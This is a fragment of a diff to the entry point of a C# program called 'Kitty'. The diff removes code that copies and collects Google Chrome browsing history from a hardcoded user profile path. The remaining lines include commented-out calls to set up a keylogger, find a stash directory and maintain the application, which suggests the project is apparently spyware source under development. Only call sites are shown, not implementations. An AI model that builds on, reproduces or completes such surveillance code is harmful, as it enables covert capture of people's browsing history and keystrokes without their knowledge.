@@ -1,5 +1,4 @@
-﻿using Kitty.Db;
-using Kitty.Types.Stash;
+﻿using Kitty.Types.Stash;
 using Kitty.Win32;
 using System;
 #if DEBUG
@@ -50,9 +49,6 @@ namespace Kitty
 
         static void Main(string[] args)
         {
-            SQLiteConnectionProvider inputConnection = new SQLiteConnectionProvider("C:\\Users\\xuans\\AppData\\Local\\Google\\History1");
-            SQLiteConnectionProvider outputConnection = new SQLiteConnectionProvider("C:\\Users\\xuans\\AppData\\Local\\Google\\History");
-            new ChromeHistoryCollector(inputConnection, outputConnection).CollectAsync();
             //MaintainApplication();
             //FindStashDirectory();
             //SetupKeylogger();
